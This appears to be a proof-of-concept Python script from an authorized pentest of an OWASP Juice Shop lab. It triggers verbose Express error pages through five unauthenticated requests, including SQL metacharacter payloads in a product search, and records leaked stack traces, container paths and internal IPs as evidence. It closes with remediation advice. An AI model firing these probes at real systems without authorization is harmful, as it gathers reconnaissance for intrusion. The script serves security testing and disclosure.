#!/usr/bin/env python3
"""
C06 - Information Disclosure via verbose internal error / stack trace
Target: http://host.docker.internal:3000  (OWASP Juice Shop, authorized lab)

Root cause: the app runs with Express' *default* error handler (NODE_ENV != production),
so any unhandled exception is serialised straight back to the client as HTML:
  * exception class + message      -> <h2><em>500</em> SyntaxError: ...</h2>
  * framework version banner       -> <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
  * full Node.js stack trace       -> <ul id="stacktrace">... at /juice-shop/build/...</ul>

Five independent unauthenticated triggers are exercised. Every one leaks internal
detail (absolute container paths, module layout, ORM/DB engine strings, internal IPs).

Run:  python3 pocs/c6_error_disclosure_v2.py
Out:  /workspace/evidence/c6_error.txt          (evidence: error text + cause)
      /workspace/evidence/c6_error_raw_responses.txt (full HTTP transcripts)
Exit: 0 if >= 2 vectors leaked a stack trace, else 1
"""
import re
import sys
import urllib.error
import urllib.request

BASE = "http://host.docker.internal:3000"

# (id, method, path, body, content-type, human description of the trigger)
VECTORS = [
    ("1", "POST", "/rest/user/login", b'{"email":', "application/json",
     "Malformed JSON body: truncated object (body-parser JSON.parse throws)"),
    ("2", "GET", "/rest/products/search?q=%27--", None, None,
     "SQL metacharacters in the search term break the generated SQLite query"),
    ("3", "GET", "/rest/products/search?q=apple%27", None, None,
     "Single quote in search term -> unterminated SQL string literal"),
    ("4", "POST", "/api/Feedbacks", b'{}', "application/json",
     "Empty object: required ORM field (captchaId) resolves to undefined"),
    ("5", "POST", "/dataerasure", b'{}', "application/json",
     "Empty object hits the data-erasure route's internal guard, which throws "
     "with the caller's IP address embedded in the message"),
]

TITLE_RE = re.compile(r"<title>(.*?)</title>", re.S)
BANNER_RE = re.compile(r"<h1>(.*?)</h1>", re.S)
H2_RE = re.compile(r"<h2>(.*?)</h2>", re.S)
FRAMES_RE = re.compile(r"<li>(.*?)</li>", re.S)


def unesc(s):
    s = (s.replace("&nbsp;", " ").replace("&lt;", "<").replace("&gt;", ">")
          .replace("&quot;", '"').replace("&#39;", "'").replace("&amp;", "&"))
    s = re.sub(r"^<em>\d+</em>\s*", "", s.strip())
    return re.sub(r"\s+", " ", s)


def send(method, path, body, ctype):
    req = urllib.request.Request(BASE + path, data=body, method=method)
    req.add_header("User-Agent", "c06-error-poc/1.0")
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")


def analyse(text):
    frames = [unesc(f).strip() for f in FRAMES_RE.findall(text)]
    frames = [f for f in frames if f]
    return {
        "title": unesc(TITLE_RE.search(text).group(1).strip()) if TITLE_RE.search(text) else "",
        "banner": unesc(BANNER_RE.search(text).group(1).strip()) if BANNER_RE.search(text) else "",
        "headline": unesc(H2_RE.search(text).group(1).strip()) if H2_RE.search(text) else "",
        "frames": frames,
        "has_stack": bool(frames) or "id=\"stacktrace\"" in text,
        "paths": sorted(set(re.findall(r"(/juice-shop/[A-Za-z0-9_./-]+)", text))),
    }


def main():
    raw, ev = [], []
    hits = 0

    for vid, method, path, body, ctype, why in VECTORS:
        status, headers, text = send(method, path, body, ctype)
        info = analyse(text)
        leaked = status == 500 and (info["has_stack"] or info["title"])

        raw.append("=" * 78)
        raw.append(f"[VECTOR {vid}] {method} {BASE}{path}")
        raw.append(f"CAUSE        : {why}")
        if body:
            raw.append(f"BODY         : {body.decode()}")
        raw.append(f"REQ HEADERS  : Content-Type: {ctype or '(none)'}")
        raw.append(f"RESP STATUS  : HTTP {status}")
        for h in ("Content-Type", "X-Content-Type-Options", "X-Frame-Options"):
            if h in headers:
                raw.append(f"RESP HEADER  : {h}: {headers[h]}")
        raw.append("-" * 78)
        raw.append(text.rstrip())
        raw.append("")

        ev.append("-" * 78)
        ev.append(f"[{vid}] {method} {BASE}{path}")
        if body:
            ev.append(f"    cause   : {why}")
            ev.append(f"    payload : {body.decode()}")
        else:
            ev.append(f"    cause   : {why}")
        ev.append(f"    result  : HTTP {status}")
        if info["banner"]:
            ev.append(f"    banner  : {info['banner']}")
        if info["headline"]:
            ev.append(f"    error   : {info['headline']}")
        elif info["title"]:
            ev.append(f"    error   : {info['title']}")
        if info["frames"]:
            for f in info["frames"]:
                ev.append(f"    frame   : {f}")
        if info["paths"]:
            ev.append(f"    leaked paths: {', '.join(info['paths'])}")
        ev.append(f"    STACK TRACE DISCLOSED: {'YES' if leaked else 'no'}")
        ev.append("")

        if leaked:
            hits += 1
        print(f"[{vid}] HTTP {status}  leak={'YES' if leaked else 'no'}  "
              f"{(info['headline'] or info['title'])[:90]}")

    summary = (f"{hits}/{len(VECTORS)} unauthenticated requests returned HTTP 500 with "
               f"an internal error rendered by Express' default error handler "
               f"(exception text + absolute /juice-shop paths + stack trace).")
    print("\n" + summary)

    with open("/workspace/evidence/c6_error.txt", "w", encoding="utf-8") as f:
        f.write("C06 - INTERNAL ERROR / STACK TRACE DISCLOSURE\n")
        f.write("Target   : " + BASE + "  (OWASP Juice Shop 20.3.0, authorized lab)\n")
        f.write("Class    : CWE-209 Generation of Error Message Containing Sensitive "
                "Information / CWE-200\n")
        f.write("Root cause: Express is running with its default (non-production) error "
                "handler, which reflects err.stack and err.message to the client.\n")
        f.write("PoC      : pocs/c6_error_disclosure_v2.py\n")
        f.write("Summary  : " + summary + "\n\n")
        f.write("Every trigger below is unauthenticated. The leaked stack traces expose\n")
        f.write("absolute container paths (/juice-shop/build/...), the Express version,\n")
        f.write("Sequelize/ORM internals, raw SQLite engine errors and internal source\n")
        f.write("IPs (::ffff:172.17.0.1). No credentials required.\n\n")
        f.write("=" * 78 + "\n")
        f.write("DISCLOSED ERROR TEXT + CAUSE\n")
        f.write("=" * 78 + "\n\n")
        f.write("\n".join(ev))
        f.write("\n" + "=" * 78 + "\n")
        f.write("REMEDIATION\n")
        f.write("=" * 78 + "\n")
        f.write("- Run with NODE_ENV=production so Express uses the generic error handler.\n")
        f.write("- Never send err.stack/ORM/DB messages to clients; log server-side only.\n")
        f.write("- Add centralised error middleware returning a generic message + trace id.\n")
        f.write("- Reject malformed JSON with 400 (body-parser error handling), not 500.\n")
        f.write("- Parameterise/validate all query input; never surface SQLITE_ERROR text.\n")

    with open("/workspace/evidence/c6_error_raw_responses.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(raw))

    print("Evidence written to /workspace/evidence/c6_error.txt")
    print("Raw transcripts  -> /workspace/evidence/c6_error_raw_responses.txt")
    return 0 if hits >= 2 else 1


if __name__ == "__main__":
    sys.exit(main())
